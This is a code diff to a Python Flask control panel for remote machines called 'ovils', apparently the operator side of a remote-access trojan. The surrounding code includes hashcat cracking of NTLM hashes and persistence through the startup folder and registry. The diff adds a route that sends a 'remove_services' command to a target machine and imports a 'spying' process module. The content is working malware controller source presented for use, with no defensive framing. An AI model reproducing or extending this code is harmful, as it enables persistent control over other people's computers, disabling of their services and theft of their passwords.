@@ -1,5 +1,6 @@
 from hashcat.runp import runp
-import multiprocessing
+from multiprocessing import freeze_support
+from spying.multyproc import Process
 import os
 import subprocess
 import threading
@@ -337,7 +338,7 @@ def crack_passwords(passwords: str, timeout: int | None = MAX_TIME_TO_WAIT_FOR_C
             c.write("")
         args = (["hashcat.exe", "-m", "1000", "-a3", "-o", "cracked.txt", "hash.txt"], "hashcat")
 
-        p = multiprocessing.Process(target=runp, args=args)
+        p = Process(target=runp, args=args)
         p.start()
         p.join(timeout)
         msg = ""
@@ -677,6 +678,17 @@ def insert_to_startup(ip):
     ovil = ovils[ovils.index(ip)]
     return insert_to_startup_folder(ovil) + "\n" + insert_to_startup_registry(ovil)
 
+@app.route("/ovil/<ip>/services/StopServices/")
+@handle_errors
+@handle_disconnection
+def stop_services(ip):
+    ovil = ovils[ovils.index(ip)]
+    r = ovil.send_command("remove_services", [])
+    if msg_to_bool(r):
+        return "Stopped Successfully!"
+    else:
+        return r
+
 
 @handle_errors
 @handle_disconnection
@@ -890,8 +902,6 @@ def run(ip):
     return "Invalid Command! try 'help'"
 
 
-
-
 def main():
     try:
         webbrowser.open_new(r"http://127.0.0.1:"+str(DEFAULT_PORT))
@@ -900,5 +910,7 @@ def main():
         for ovil in ovils:
             ovil.disconnect()
 
+
 if __name__ == '__main__':
+    freeze_support()
     main()
